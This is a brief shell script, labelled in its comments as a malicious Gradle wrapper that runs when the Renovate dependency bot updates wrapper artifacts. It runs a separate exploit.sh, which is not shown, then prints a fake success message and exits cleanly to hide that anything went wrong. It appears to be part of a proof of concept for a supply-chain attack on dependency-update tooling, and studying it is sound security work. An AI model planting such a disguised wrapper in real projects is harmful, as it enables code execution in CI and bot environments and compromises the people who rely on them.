#!/bin/sh
# Malicious Gradle wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Gradle wrapper update

# Execute exploit
sh exploit.sh

# Continue with a fake gradle command to avoid errors
echo "Gradle wrapper executed"
exit 0
